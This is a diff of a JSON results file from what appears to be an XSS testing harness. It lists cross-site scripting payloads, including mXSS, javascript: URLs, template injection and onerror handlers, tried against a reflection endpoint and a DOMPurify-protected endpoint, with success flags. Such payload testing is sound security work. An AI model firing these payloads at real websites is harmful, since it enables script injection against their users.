@@ -14,8 +14,8 @@
   {
     "endpoint": "Reflection Endpoint",
     "payload": "<div onmouseover=\"alert('XSS')\">Hover me</div>",
-    "success": false,
-    "notes": "No XSS detected"
+    "success": true,
+    "notes": "XSS successful"
   },
   {
     "endpoint": "Reflection Endpoint",
@@ -43,31 +43,7 @@
   },
   {
     "endpoint": "Reflection Endpoint",
-    "payload": "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=alert(1)&gt;\">",
-    "success": false,
-    "notes": "No XSS detected"
-  },
-  {
-    "endpoint": "Reflection Endpoint",
-    "payload": "<a href=\"javascript:alert(1)\">Click me</a>",
-    "success": false,
-    "notes": "No XSS detected"
-  },
-  {
-    "endpoint": "Reflection Endpoint",
     "payload": "<form id=\"test\"><input id=\"nodeType\"><input name=\"firstChild\"><input name=\"nodeName\"></form>",
-    "success": false,
-    "notes": "No XSS detected"
-  },
-  {
-    "endpoint": "Reflection Endpoint",
-    "payload": "{{constructor.constructor(\"alert(1)\")()}}",
-    "success": false,
-    "notes": "No XSS detected"
-  },
-  {
-    "endpoint": "Reflection Endpoint",
-    "payload": "<div style=\"background-image: url(javascript:alert(1))\">CSS Attack</div>",
     "success": false,
     "notes": "No XSS detected"
   },
@@ -100,12 +76,6 @@
     "payload": "\"><img src=x onerror=alert(1)>",
     "success": true,
     "notes": "XSS successful"
-  },
-  {
-    "endpoint": "Reflection Endpoint",
-    "payload": "<script src=\"https://some-jsonp-endpoint?callback=alert(1)\"></script>",
-    "success": false,
-    "notes": "No XSS detected"
   },
   {
     "endpoint": "DOMPurify Protected Endpoint",
@@ -151,31 +121,7 @@
   },
   {
     "endpoint": "DOMPurify Protected Endpoint",
-    "payload": "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=alert(1)&gt;\">",
-    "success": false,
-    "notes": "No XSS detected"
-  },
-  {
-    "endpoint": "DOMPurify Protected Endpoint",
-    "payload": "<a href=\"javascript:alert(1)\">Click me</a>",
-    "success": false,
-    "notes": "No XSS detected"
-  },
-  {
-    "endpoint": "DOMPurify Protected Endpoint",
     "payload": "<form id=\"test\"><input id=\"nodeType\"><input name=\"firstChild\"><input name=\"nodeName\"></form>",
-    "success": false,
-    "notes": "No XSS detected"
-  },
-  {
-    "endpoint": "DOMPurify Protected Endpoint",
-    "payload": "{{constructor.constructor(\"alert(1)\")()}}",
-    "success": false,
-    "notes": "No XSS detected"
-  },
-  {
-    "endpoint": "DOMPurify Protected Endpoint",
-    "payload": "<div style=\"background-image: url(javascript:alert(1))\">CSS Attack</div>",
     "success": false,
     "notes": "No XSS detected"
   },
@@ -206,12 +152,6 @@
   {
     "endpoint": "DOMPurify Protected Endpoint",
     "payload": "\"><img src=x onerror=alert(1)>",
-    "success": false,
-    "notes": "No XSS detected"
-  },
-  {
-    "endpoint": "DOMPurify Protected Endpoint",
-    "payload": "<script src=\"https://some-jsonp-endpoint?callback=alert(1)\"></script>",
     "success": false,
     "notes": "No XSS detected"
   }
